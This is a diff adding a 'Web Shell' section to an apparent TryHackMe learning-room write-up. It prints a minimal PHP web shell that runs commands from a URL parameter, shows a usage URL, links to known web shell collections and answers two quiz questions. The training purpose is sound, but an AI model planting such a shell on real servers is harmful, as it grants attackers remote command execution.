@@ -7,6 +7,7 @@
 - [Bind Shell](#bind-shell)
 - [Shell Listeners](#shell-listeners)
 - [Shell Payloads](#shell-payloads)
+- [Web Shell](#web-shell)
 
 
 ## Room Introduction
@@ -334,3 +335,62 @@ The only scripting language we used here was python.
 Trying this as the answer
 #### ✅ Answer
 - `python` ✅
+
+
+## Web Shell
+This section goes over how the webshell works. 
+
+It uses the example of `shell.php` below which is uploaded to the web server. 
+
+```php
+<?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+```
+
+Example rooms:
+- ❓ [Upload Vulnerabilities](https://tryhackme.com/room/uploadvulns)
+- ❓ [File Inclusion](https://tryhackme.com/room/fileinc)
+- ❓ [Command Injection](https://tryhackme.com/room/oscommandinjection)
+
+Once the `shell.php` file has been you can navigate to the file directly for example `http://example.com/uploads/shell.php`.
+
+We can then issue commands via the command `?cmd=whoami` 
+
+**Example**
+- `http://example.com/uploads/shell.php?cmd=whoami`
+
+### Shells available online
+**[p0wny-shell](https://github.com/flozz/p0wny-shell)**
+> p0wny@shell:~# is a very basic, single-file, PHP shell. It can be used to quickly execute commands on a server when pentesting a PHP application. Use it with caution: this script represents a security risk for the server.
+
+**[b374k](https://github.com/b374k/b374k)**
+> This PHP Shell is a useful tool for system or web administrator to do remote management without using cpanel, connecting using ssh, ftp etc. All actions take place within a web browser
+
+**[c99 shell](https://www.r57shell.net/single.php?id=13)**
+> A well-known and robust PHP web shell with extensive functionality.
+
+An extensive list of web shells can be found at [https://www.r57shell.net/index.php](https://www.r57shell.net/index.php).
+
+### ❓ Question
+> What vulnerability type allows attackers to upload a malicious script by failing to restrict file types?
+#### 🧪 Process
+This capability is as a result of `unrestricted file upload`. 
+
+Trying this as the answer
+#### ✅ Answer
+- `Unrestricted file upload` ✅
+
+### ❓ Question
+> What is a malicious script uploaded to a vulnerable web application to gain unauthorized access?
+#### 🧪 Process
+The name of the section `web shell`.
+
+Trying this as the answer
+#### ✅ Answer
+- `web shell` ✅
+
+
+
